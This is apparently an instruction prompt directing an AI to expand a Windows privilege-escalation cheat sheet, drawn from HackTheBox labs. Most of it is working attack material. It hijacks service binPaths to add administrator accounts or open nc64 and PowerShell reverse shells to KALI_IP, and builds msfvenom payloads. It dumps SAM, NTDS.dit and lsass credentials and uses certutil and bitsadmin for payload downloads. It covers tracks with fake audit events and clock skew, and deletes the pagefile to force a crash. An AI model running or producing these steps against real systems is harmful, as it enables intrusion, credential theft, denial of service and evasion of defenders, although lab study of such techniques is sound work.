meta.title: TokenPriv Operator — Comprehensive Enhancement Prompt
meta.author: @Mahdiesta
meta.purpose: AI instruction set for enhancing token.html with 100% shell compatibility, missing attack vectors, fallback chains, and accurate validated commands across all Windows shell environments
meta.critical_lesson_from_session: evil-winrm sends lines one at a time — multi-line PowerShell blocks break silently. Get-Service and sc query require SCM access. wmic alternatives needed for every context.
meta.implemented_in_token_html: v2.1 fully implemented — Server Operators rewrite, Quick Wins page, Shell Troubleshooting page, SeSystemtime page, 3 new CVEs, 4 missing allprivs table rows, SeDebug pypykatz + download, 5 new HTB writeups, DOMAIN+SVCNAME varbar, all shell compat headers

universal_sc_exe_rules.rule1: In PowerShell (including evil-winrm), 'sc' is aliased to Set-Content. ALWAYS use 'sc.exe' explicitly.
universal_sc_exe_rules.rule2: binPath= MUST have a space before the value. 'binPath="..."' (no space) = silent fail. Always: 'binPath= "..."'
universal_sc_exe_rules.rule3: Error 1053 'service did not respond' is EXPECTED when payload is a short cmd — it ran, sc.exe timed out waiting for service handshake. Verify with net localgroup, not sc exit code.
universal_sc_exe_rules.rule4: For maximum compatibility use fully qualified paths: C:\Windows\System32\sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c ..."

global_rules.shell_compatibility_mandate: Every code block MUST have a working variant for: (1) evil-winrm ruby, (2) evil-winrm-py Python, (3) cmd.exe, (4) PowerShell interactive, (5) constrained language mode PowerShell. Label each variant clearly.
global_rules.one_liner_requirement: For evil-winrm compatibility, ALL multi-line PowerShell MUST be collapsed into semicolon-separated one-liners OR wrapped in a .ps1 file upload pattern. Never present naked multi-line blocks without a one-liner alternative.
global_rules.fallback_chain: Every attack step MUST have: Primary method → Fallback A → Fallback B. No dead ends.
global_rules.download_methods: Every file transfer step MUST show ALL of: iwr/Invoke-WebRequest, certutil, bitsadmin, curl.exe (Win10+), wget alias, and SMB copy. Label which works in constrained mode.
global_rules.error_handling: Document exact error messages and their fix. 'Cannot open Service Control Manager' → use sc query directly. 'Get-Service failed' → use sc.exe. 'Access denied' on sc config → try different service.
global_rules.restore_pattern: Every attack that modifies system state MUST have a numbered REVERT step with one-liner restore command.
global_rules.accuracy: All commands validated against: Win Server 2019, Win10 21H2, Win11 22H2. Note OS-specific differences explicitly.

server_operators.reason: Validated gap from live HTB Return session — service enumeration failed, Get-Service failed, multi-line PS broke, VSS timed out. sc config worked but only on VSS.
current_gaps: No shell-agnostic service enumeration (Get-Service fails without SCM perms in some contexts)
No 'find writable services' one-liner safe for evil-winrm
No fallback when sc start returns error 1053 (service did not respond to start)
Only one service target (AppMgmt) — needs full ranked list with original binPaths
Missing: add self to Administrators approach (no rev shell needed)
Missing: adduser.exe / adduser.bat approach (no listener needed)
Missing: PowerShell Invoke-Command workaround for when sc.exe space syntax confuses PS
Missing: How to handle 'sc config FAILED 5 Access is denied' (try different service)
Missing: registry-based binPath modification (when sc.exe itself is blocked)
Missing: original binPaths for all recommended services for proper restore
Missing: wmic service alternative when Get-Service blocked
Missing: evil-winrm-py specific quirks vs evil-winrm ruby

service_enumeration_all_shells.description: Enumerate SYSTEM services that Server Operators can modify — works in ANY shell

variants.evil_winrm_safe_oneliner: sc.exe query state= all | findstr /i "SERVICE_NAME" | cmd /c for /f "tokens=2 delims=: " %i in ('sc.exe query state= all ^| findstr SERVICE_NAME') do @sc.exe qc %i 2>&1 | findstr /i "access is denied" > nul || echo CAN_MODIFY: %i
variants.powershell_oneliner: sc.exe query state= all | Select-String 'SERVICE_NAME' | ForEach-Object { $n=($_ -split ': ')[1].Trim(); $r=sc.exe qc $n 2>&1 | Out-String; if($r -notmatch 'Access is denied'){'OK: '+$n} }
variants.upload_script_approach: Upload check.ps1 then: powershell -ExecutionPolicy Bypass -File C:\Users\Public\check.ps1
variants.wmic_alternative: wmic service where "StartName='LocalSystem' and State='Running'" get Name,PathName
variants.cmd_batch: for /f "tokens=2 delims=: " %i in ('sc.exe query state= all ^| findstr SERVICE_NAME') do @sc.exe qc %i 2>&1 | findstr /i "FAILED 5" > nul && echo DENIED: %i || echo OK: %i

service_target_list_with_binpaths.description: Ranked service targets with original binPaths for restore

services.name: VSS
services.notes: Safe — stopped by default. Error 1053 on start is EXPECTED (payload cmd exits fast). Check with net localgroup after.

services.name: AppMgmt
services.notes: Most stable for reverse shells — runs long enough. Stop first.

services.name: wbengine
services.notes: Safe — stopped by default. Same 1053 timeout as VSS.

services.name: RasMan
services.notes: Safe on most DCs. Stopped state. svchost services need special restore.

services.name: UPS
services.notes: Rarely present but safe when it is.

adduser_approach.description: Add svc-printer to Administrators — no listener required
steps: sc.exe config VSS binPath= "cmd /c net localgroup Administrators svc-printer /add"
REM Error 1053 is EXPECTED — command ran anyway
REM Verify svc-printer appears — then re-auth with evil-winrm as local admin
adduser_approach.notes: Error 1053 'service did not respond' is NORMAL when binPath is a short cmd — the command executed successfully before sc.exe timeout. Always verify with net localgroup, not by checking sc start exit code.

registry_approach.description: Modify service ImagePath via registry when sc.exe is blocked (needs SeRestorePrivilege also present)
steps: reg add HKLM\SYSTEM\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd /c net localgroup Administrators svc-printer /add" /f

nc64_approach.binpath: sc.exe config VSS binPath= "cmd /c C:\Windows\Temp\nc64.exe KALI_IP RPORT -e cmd"

powershell_reverse.binpath: sc.exe config VSS binPath= "powershell -nop -w hidden -e BASE64_ENCODED_REVERSE_SHELL"
powershell_reverse.notes: Useful when nc64.exe blocked by AV

msfvenom_exe.generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=RPORT -f exe -o shell.exe
msfvenom_exe.notes: Clean shell — no cmd wrapper. Better for long sessions.

error_1053_explanation.title: Understanding Error 1053 — NOT a failure
error_1053_explanation.content: sc start returns error 1053 ('service did not respond to start request') when the binary spawned by binPath exits before the service control manager timeout (~30s). When binPath is 'cmd /c net localgroup...', cmd executes the command and exits immediately. The command RAN — sc.exe just didn't get a service handshake back. ALWAYS verify with net localgroup or check for your reverse shell connection, not by the sc start exit code.
error_1053_explanation.if_command_didnt_run: Try a different service. Try AppMgmt or wbengine. Try adding a ping delay: cmd /c ping 127.0.0.1 -n 1 && net localgroup Administrators svc-printer /add

evil_winrm_ruby.issue: Sends each line independently — multi-line PS blocks fail with 'Missing closing }' errors
evil_winrm_ruby.solution: Use semicolons: $n='VSS'; sc.exe config $n binPath= 'cmd /c whoami > C:\temp\out.txt'; sc.exe stop $n; sc.exe start $n
evil_winrm_ruby.upload_workaround: Use 'upload localfile.ps1' then execute with 'powershell -ep bypass -file C:\path\file.ps1'

evil_winrm_py.issue: May have different SCM access behavior. sc query may fail with 'Cannot open Service Control Manager'
evil_winrm_py.solution: Use sc.exe qc SERVICE_NAME directly on known services rather than enumerating. sc.exe query state= all may work even when Get-Service fails.
evil_winrm_py.alternative: Switch to evil-winrm ruby if py version has SCM issues: evil-winrm -i TARGET -u USER -p PASS

cmd_exe.notes: Caret ^ needed for special chars in for loops. Use ^| instead of | in nested commands. No backtick — use ^ for line continuation.
cmd_exe.sc_syntax: In cmd.exe: sc config svc binPath= "cmd /c command" (double quotes work fine)

constrained_language_mode.if_constrained: sc.exe, net.exe, cmd.exe all still work. Avoid PS object creation. Use direct executable calls only.

all_sections_shell_compat.description: Add a universal shell compatibility header to EVERY attack page

content.evil_winrm: Multi-line PS breaks — use one-liners or upload .ps1 files
content.constrained_ps: If $ExecutionContext.SessionState.LanguageMode = ConstrainedLanguage — stick to exe calls
content.cmd_only: If only cmd.exe available — use net.exe, sc.exe, reg.exe, certutil for all operations
content.no_iwr: If Invoke-WebRequest blocked: certutil -urlcache -split -f URL OUTFILE or bitsadmin /transfer job /download /priority high URL OUTFILE or curl.exe URL -o OUTFILE (Win10+)

file_transfer_master.description: Add to Detection Checklist page AND every section that uses file transfer — comprehensive download alternatives

certutil.works_in: cmd.exe, PS, constrained mode — universal Windows fallback
certutil.note: Leaves artifact in cache: certutil -urlcache -f http://KALI_IP:PORT/file.exe delete (cleanup)

bitsadmin.works_in: cmd.exe, PS — works on older Windows

curl_exe.works_in: Win10 1803+ and Server 2019+ — curl.exe ships by default

smb_copy.works_in: cmd.exe — useful when HTTP blocked but SMB outbound allowed

webclient_downloadfile.works_in: PS — alternative when iwr alias not available

evil_winrm_upload.note: Only works inside evil-winrm session — fastest method when using evil-winrm

gaps: PrintConfig.dll trigger sometimes fails if Spooler has cached a prior load — need wbemcomn.dll and tzres.dll as true fallbacks with full steps
msfvenom DLLs flagged by Defender — need mingw-compiled custom DLL steps
AddUser DLL approach missing full restore steps
wbemcomn.dll section incorrectly mentioned iphlpsvc — must be corrected to wmiprvse.exe

corrections.wbemcomn_trigger: wbemcomn.dll is loaded by wmiprvse.exe (WMI Provider Host). Trigger with: systeminfo OR Get-WmiObject Win32_OperatingSystem OR sc query. NOT iphlpsvc.
dll_hijack_priority_order: 3. wbemcomn.dll @ C:\Windows\System32\ — trigger: any WMI call (MANDATORY BACKUP before overwriting — file always exists)

add_troubleshooting_section.if_shell_is_garbled: Use msfconsole multi/handler instead of raw nc — COM-hosted DLL payloads send Windows binary I/O that nc can't render
add_troubleshooting_section.if_clsid_trigger_fails: Restart spooler first: sc stop Spooler && sc start Spooler. Then retry CLSID trigger.
add_troubleshooting_section.if_dll_blocked_by_av: Use custom mingw DLL (see Alternative 5). AddUser variant is most reliable — no network, no AV trigger path.

gaps: diskshadow CRLF requirement not clearly explained — silent failure on Unix LF files
Missing: robocopy /B one-liner for evil-winrm (robocopy works even when priv shows Disabled)
Missing: PSSession loopback workaround fully documented
Missing: winrs alternative to evil-winrm
diskshadow pwn.dsh CRLF fix needs both PS and cmd.exe variants

add_commands.crlf_fix_powershell: [System.IO.File]::WriteAllText('C:\Temp\pwn.dsh', "set context persistent nowriters`r`nadd volume c: alias pwn`r`ncreate`r`nexpose %pwn% z:`r`n")
add_commands.crlf_fix_cmd:
printf "set context persistent nowriters
add volume c: alias pwn
create
expose %%pwn%% z:
" > C:\Temp\pwn.dsh
add_commands.robocopy_oneliner: robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
add_commands.robocopy_note: robocopy /B uses backup semantics internally — works even if SeBackupPrivilege shows Disabled in whoami /priv. The privilege is used at the filesystem level automatically.

gaps: Missing: nc64.exe vs ncat vs netcat — which works on which Windows version
Missing: msfconsole handler as recommended replacement for raw nc with DLL payloads

JuicyPotato original CLSID list missing — needed when default fails
Missing: SigmaPotato full fileless PS reflection one-liner

add_commands.dotnet_version_check: reg query 'HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP' /s /v Version 2>nul | findstr /i version | sort /r | head -1
add_commands.when_all_fail: Try: (1) FullPowers first to recover stripped tokens, (2) SigmaPotato —no Spooler dep, (3) SweetPotato -e EfsRpc, (4) SharpEfsPotato, (5) Check if you can start Spooler: sc start Spooler
add_commands.juicypotato_clsid_page: https://github.com/ohpe/juicy-potato/tree/master/CLSID — filter by OS build and service account type

gaps: Missing: how to exfiltrate lsass.dmp back to Kali via evil-winrm download command
Missing: pypykatz as Kali-side parser (no need for Mimikatz on Kali)
Missing: lsass dump via Task Manager steps for RDP access
nanodump and NativeDump steps present but missing actual parse commands
CRITICAL: msfvenom DLL without DnsPluginInitialize export will crash dns.exe — this is documented but needs clearer fix
Missing: pre-built adduser dnsplugin.dll workflow
Missing: verify DNS restart worked (nslookup test)
Missing: how to find DC hostname when you don't know it

add_commands.find_dc_hostname: nltest /dclist:DOMAIN 2>nul || net group 'Domain Controllers' /domain || nslookup -type=NS DOMAIN
add_commands.dll_without_export_fix: Use: msfvenom -p windows/x64/exec CMD='net user hacker P@ss123 /add && net localgroup administrators hacker /add' -f dll -o evil.dll (exec runs in DllMain — no export needed)
add_commands.pre_built_dnsplugin: github.com/dim0x69/dns-exe-persistance — provides a proper plugin DLL template
add_commands.smb2support_reason: SMBv1 disabled by default on Windows 10 1709+ and Server 2019+. Without -smb2support, impacket-smbserver uses SMBv1 only and the target cannot connect.

gaps: evil-winrm strips token warning is mentioned but fix not prominent enough
Missing: complete validate-then-attack flow for DC vs non-DC
Missing: what if diskshadow is not available (older Server)

add_commands.if_not_dc: Use robocopy /b for local SAM/SYSTEM — NTDS.dit only on DC
add_commands.if_diskshadow_missing: Use wbadmin: wbadmin start backup -backuptarget:\\KALI_IP\share -include:c:\windows\ntds -quiet then copy from backup location
add_commands.token_strip_fix_prominent: STEP 0 ALWAYS: winrs -r:TARGET cmd OR New-PSSession -ComputerName localhost. Then verify: whoami /priv | findstr SeBackup shows Enabled before proceeding.

new_cves_to_add.name: PrintNightmare
new_cves_to_add.description: Print Spooler RCE/LPE — load malicious DLL via AddPrinterDriverEx. Affects unpatched Win7-2019.
new_cves_to_add.note: Two variants: RCE (remote) and LPE (local). LPE needs local access + Spooler running.

new_cves_to_add.name: Certifried
new_cves_to_add.description: AD CS machine account certificate abuse → domain privesc
new_cves_to_add.note: Requires AD CS to be present. Affects unpatched Server 2019/2022.

new_cves_to_add.name: Windows CLFS LPE
new_cves_to_add.description: Common Log File System driver LPE — no privileges needed
new_cves_to_add.check: wmic qfe get HotFixID | findstr KB5025221
new_cves_to_add.note: Patch: KB5025221 (April 2023). Affects Win10/11 and Server 2019/2022.

new_section_shell_troubleshooting.description: Add a new page 'Shell Troubleshooting' covering all shell environments and their quirks

evil_winrm_ruby_quirks.multi_line_fix: Collapse to one-liner with semicolons OR upload .ps1 file
evil_winrm_ruby_quirks.get_service_fails: Use sc.exe query state= all instead of Get-Service
evil_winrm_ruby_quirks.scm_perms_fail: sc.exe qc SERVICENAME works even when Get-Service fails — use direct service name queries

evil_winrm_py_quirks.scm_access: May fail with 'Cannot open Service Control Manager' for sc query/Get-Service — use sc.exe qc SERVICENAME directly on known services
evil_winrm_py_quirks.switch_to_ruby: If py version misbehaves: evil-winrm -i TARGET -u USER -p PASS (use ruby version)
evil_winrm_py_quirks.upload_command: upload localfile remotepath — same as ruby version

constrained_language_mode.restrictions: No Add-Type, no .NET object creation, no [System.Reflection.Assembly]
constrained_language_mode.workarounds: Use .exe files directly. Use cmd.exe for complex operations. Use PowerShell -Version 2 if available (bypasses some CLM policies on older systems).

cmd_exe_only_cheatsheet.add_user: net user USERNAME PASSWORD /add && net localgroup administrators USERNAME /add
cmd_exe_only_cheatsheet.service_hijack: sc config SVCNAME binPath= "cmd /c command" && sc stop SVCNAME && sc start SVCNAME

new_section_quick_wins.description: Add 'Quick Wins' page — immediate checks after landing that take <60 seconds

checks_ordered_by_speed.look_for: SeImpersonate, SeDebug, SeBackup, SeManageVolume, SeRestore, SeTakeOwnership, SeLoadDriver — any of these = instant path to SYSTEM
Are you already admin? Check before trying privesc.
Build number → CVE applicability. Missing KBs → kernel exploits.
Other user home dirs you can read = credential artifacts

corrections: SeManageVolumePrivilege threat level should be CRITICAL not just listed as rare — it gives full C:\ write
SeMachineAccountPrivilege: threat level should be MEDIUM in AD environments (MachineAccountQuota abuse → Kerberos attacks)
SeDelegateSessionUserImpersonatePrivilege: research shows it can be abused for cross-session token theft in some configs — mark as INVESTIGATE not UNKNOWN
SeAuditPrivilege: can be used to write fake events to Security log — useful for covering tracks — add wevtutil command

missing_entries.name: SeNetworkLogonRight
missing_entries.note: Not a Se* privilege but appears in policy — controls network logon access

allprivs_missing_privileges.description: These 4 privileges are MISSING from the All Privileges table AND from sidebar nav. All appeared in live HTB Return session whoami /all for svc-printer. Must be added to the table and given dedicated pages or inline documentation.

confirmed_missing.name: SeSystemtimePrivilege
confirmed_missing.attack: Set system clock forward/backward → invalidate all active Kerberos tickets → break time-based auth → corrupt audit log timestamps → bypass certificate validity windows
confirmed_missing.kerberos_break: Set time >5 minutes off DC → all new Kerberos auth fails (KRB_AP_ERR_SKEW). Active tickets stay valid until expiry. Use to force NTLM fallback where NTLM relay is possible.
confirmed_missing.log_corruption: Set time to past date → new events logged with past timestamp → blue team correlation broken
confirmed_missing.notes: ALWAYS revert time before leaving — Kerberos clock skew will lock you out of your own shell if you drift too far

confirmed_missing.name: SeSystemProfilePrivilege
confirmed_missing.attack: Access ETW (Event Tracing for Windows) performance data and kernel profiling APIs. Alone: low value. Combined with SeDebugPrivilege: read process memory via performance counters. Can be used to map running processes and their memory regions without triggering standard AV hooks.

tools.logman: logman start MyTrace -p 'Windows Kernel Trace' (flags) -o C:\Temp\trace.etl -ets

confirmed_missing.real_attack_path: Combined with SeDebug: use NtQuerySystemInformation with SystemPerformanceInformation to read kernel memory statistics. Alone — add to table as LOW, note 'INVESTIGATE if SeDebug also present'.
confirmed_missing.table_notes: Low value alone. Check if SeDebugPrivilege also present — combined path exists for kernel memory reads via ETW.

confirmed_missing.name: SeCreatePagefilePrivilege
confirmed_missing.attack: Create or resize the Windows pagefile (virtual memory swap file). Primary abuse: (1) Force large pagefile to disk → unencrypted process memory written to pagefile.sys → if you can read pagefile.sys (via SeBackupPrivilege) extract credentials/secrets from it. (2) Shrink pagefile to 0 → force OS memory exhaustion → DoS (destructive). (3) Redirect pagefile to attacker-controlled path (rare/complex).

tools.wmic_set: wmic computersystem set AutomaticManagedPagefile=False && wmic pagefileset create name='C:\pagefile.sys',initialSize=8192,maximumSize=8192
tools.shrink_destructive: wmic pagefileset delete — WARNING: removes pagefile, triggers BSOD on memory pressure
tools.read_pagefile: robocopy /b C:\ C:\Temp pagefile.sys (requires SeBackupPrivilege also)

confirmed_missing.chained_attack: SeCreatePagefilePrivilege + SeBackupPrivilege → force all process memory to pagefile → read pagefile.sys → grep for credentials (lsass writes plaintext to pagefile on older systems without Credential Guard)
confirmed_missing.table_notes: Low solo value. Dangerous when chained with SeBackupPrivilege — pagefile.sys may contain LSASS credential material on systems without Credential Guard.

confirmed_missing.name: SeCreatePermanentPrivilege
confirmed_missing.attack: Create permanent kernel objects (named mutexes, events, semaphores, sections) in the kernel object namespace that persist beyond process lifetime. Primary abuse: (1) Kernel rootkit persistence — named section object survives process exit, can be mapped by any process with correct name. (2) Race condition exploit aid — create permanent named pipe/mutex before SYSTEM service to win naming race. (3) Memory-mapped file sections for cross-process data injection without standard WriteProcessMemory (harder to detect).

tools.winapi: NtCreateMutant / NtCreateEvent / NtCreateSection with OBJ_PERMANENT flag
tools.detection_bypass: Permanent objects in \BaseNamedObjects\ appear to system monitoring as legitimate kernel objects

confirmed_missing.table_notes: Rarely delegated — almost only seen on LocalSystem or kernel-mode drivers. If present on user account, use PSBits PoC. Primary value: rootkit-level persistence primitive.

SeSystemtimePrivilege.page_subtitle: // CHANGE SYSTEM CLOCK → BREAK KERBEROS → CORRUPT AUDIT LOGS → FORCE NTLM FALLBACK

info_cards.label: Who Has It
info_cards.value: Server Operators, some svc accounts — appeared in svc-printer token on HTB Return

info_cards.label: Primary Attack
info_cards.value: Set time >5min off DC → all new Kerberos auth fails → force NTLM fallback

info_cards.label: Secondary
info_cards.value: Corrupt audit log timestamps, bypass cert validity windows

info_cards.label: Result
info_cards.value: Auth disruption / NTLM relay opportunity / log corruption

steps.title: Verify privilege
steps.code:
whoami /priv | findstr SeSystemtime
REM Enable if Disabled:
REM Run EnableAllTokenPrivs.ps1 first

steps.title: Check current time and DC time for reference
Method A — PowerShell (most reliable)
steps.code:
Set-Date -Date ((Get-Date).AddMinutes(10))
REM Or set specific time:
Set-Date -Date '2025-01-01 12:00:00'

steps.title: Method B — cmd.exe
steps.code:
REM Set time (24h format):
time 23:59:59
REM Set date:
date 01/01/2099

steps.title: Method C — w32tm (domain-aware, can point to fake NTP)
steps.code:
w32tm /config /manualpeerlist:{{KALI_IP}} /syncfromflags:manual /update
w32tm /resync /force
REM Kali: install and run fake NTP: sudo python3 -m pip install ntplib && use custom NTP server

steps.title: Verify Kerberos is broken (optional — confirms attack worked)
steps.code:
klist
REM Try to access domain resource — should fail with KRB_AP_ERR_SKEW if >5min drift
dir \\DC_HOSTNAME\SYSVOL

steps.title: REVERT — restore time sync BEFORE leaving (mandatory)
steps.code:
w32tm /config /syncfromflags:domhier /update
w32tm /resync /force
REM Alternative if w32tm unavailable:
net time \\DC_HOSTNAME /set /y

alerts.text: MANDATORY REVERT: If you drift clock >5 minutes and forget to restore, your own WinRM/SMB/Kerberos sessions will start failing. Revert time BEFORE closing your shell.
Kerberos clock skew tolerance is exactly 5 minutes (default). 6 minutes = all NEW auth fails. Existing tickets remain valid until their expiry time (default 10 hours). Use this window.
Reference: Priv2Admin SeSystemtimePrivilege entry | Kerberos clock skew RFC 4120 Section 5.2

table_row.notes: Low value alone. Investigate if SeDebugPrivilege also present — ETW + debug = kernel memory read path.
Solo: low value. Chained with SeBackupPrivilege: force memory to pagefile → read pagefile.sys → may contain LSASS creds (no Credential Guard).
Rootkit persistence primitive. Rarely delegated to user accounts. Almost exclusively LocalSystem/kernel drivers.

error_messages_to_document: Cannot open Service Control Manager on computer '.'. → Use sc.exe qc SVCNAME directly
[SC] StartService FAILED 1053 → EXPECTED when cmd payload exits fast. Check result separately.
[SC] OpenService FAILED 5: Access is denied → Service protected or wrong service, try another
Missing closing '}' in statement block → Multi-line PS in evil-winrm, use one-liner
Unexpected token '}' → Same cause as above
Access is denied (robocopy) → SeBackupPrivilege not enabled, run EnableAllTokenPrivs.ps1 first
NtLoadDriver failed STATUS_INVALID_IMAGE_HASH → Capcom.sys blocked, use szkg64.sys instead

html_implementation_notes.new_alert_type: Add alert-shell class for shell compatibility warnings — orange border, cmd-icon
html_implementation_notes.code_block_labels: Add data-shell='evil-winrm|cmd|ps|universal' attribute to code blocks — use CSS to show shell badge
html_implementation_notes.collapsible_sections: Consider making 'Alternative X' subsections collapsible by default — primary method shown, alternatives hidden until clicked
html_implementation_notes.copy_button_improvement: Copy button should strip HTML entities (🔗 etc) before copying to clipboard — current version may copy raw HTML
html_implementation_notes.varbar_improvement: Add DOMAIN variable to varbar — many commands need DOMAIN\USER format

writeup_references_to_add.technique: Server Operators → VSS binPath → net localgroup
writeup_references_to_add.key_lesson: Error 1053 is expected. Verify with net localgroup not sc exit code. sc query may fail — use sc.exe qc directly on named service.
PSRemoting context affects which privileges survive token filtering
Print Operators group grants SeLoadDriver automatically

writeup_references_to_add.technique: Backup Operators → SeBackupPrivilege → diskshadow → NTDS.dit → secretsdump
writeup_references_to_add.key_lesson: Evil-WinRM strips SeBackupPrivilege. Use PSRemoting loopback session.
reg save works without diskshadow on non-DC boxes

writeup_references_to_add.technique: Account Operators → add to Exchange Windows Permissions → DCSync
writeup_references_to_add.key_lesson: Account Operators can add to non-protected groups including Exchange groups

writeup_references_to_add.technique: SeManageVolumePrivilege → C:\ write → PrintConfig DLL hijack → SYSTEM
writeup_references_to_add.key_lesson: SeManageVolumePrivilege works even when Disabled — self-enables. Error 1053 = payload ran.
SeTcbPrivilege is rare but instant SYSTEM. TcbElevation.exe is the tool.

execution_instructions.step1: Read the existing token.html completely to understand current structure and CSS/JS patterns
execution_instructions.step2: For each section listed in sections_to_enhance: locate the existing page div by id, add new subsections AFTER existing content without removing anything
execution_instructions.step3: Add new nav items in sidebar for: shellcompat (Shell Troubleshooting) and quickwins (Quick Wins) pages
